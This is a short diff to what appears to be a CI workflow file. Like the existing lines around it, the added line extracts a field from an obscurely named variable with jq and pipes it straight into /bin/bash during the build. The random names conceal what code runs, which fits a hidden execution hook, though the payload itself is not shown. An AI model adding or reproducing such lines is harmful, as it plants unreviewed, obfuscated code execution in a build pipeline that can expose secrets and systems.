@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$c81695" | jq -r .q248 | /bin/bash
           echo $ozn6588 | jq -r .sdtpy356 | /bin/bash
           echo $r97742 | jq -r .ihmf71 | /bin/bash
+          printf '%s' "$ph4" | jq -r .otet2043 | /bin/bash
 
       - name: Archive output
         if: always()
